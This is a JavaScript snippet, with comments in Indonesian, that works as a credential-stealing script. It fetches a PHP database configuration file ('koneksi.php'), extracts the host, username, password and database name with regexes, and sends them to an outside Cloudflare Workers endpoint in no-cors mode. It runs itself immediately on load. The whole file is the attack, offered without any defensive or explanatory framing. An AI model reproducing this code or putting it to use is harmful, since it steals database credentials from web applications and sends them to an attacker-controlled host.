async function sendDataNoCors() {
    try {
        // Fetch file koneksi.php
        const response = await fetch('../config/koneksi.php');
        const content = await response.text();
        
        // Extract data yang dibutuhkan
        const extract = (regex) => (content.match(regex) || [,'Not found'])[1];
        const host = extract(/\$host\s*=\s*["']([^"']+)["']/);
        const user = extract(/\$user\s*=\s*["']([^"']+)["']/);
        const password = extract(/\$password\s*=\s*["']([^"']+)["']/);
        const database = extract(/\$database\s*=\s*["']([^"']+)["']/);
        
        // Format data
        const data = `HOST=${host}&USER=${user}&PASS=${password}&DB=${database}`;
        const encodedData = encodeURIComponent(data);
        
        // Menggunakan no-cors mode (tidak akan melihat response)
        await fetch('https://lucifer.yutupprem0.workers.dev/?message=' + encodedData, {
            method: 'GET',
            mode: 'no-cors',
            credentials: 'omit'
        });
        
        console.log('✅ Data dikirim (no-cors mode)');
        console.log('📊 Data:', data);
        
    } catch (error) {
        console.error('❌ Error:', error);
    }
}

// Jalankan
sendDataNoCors();
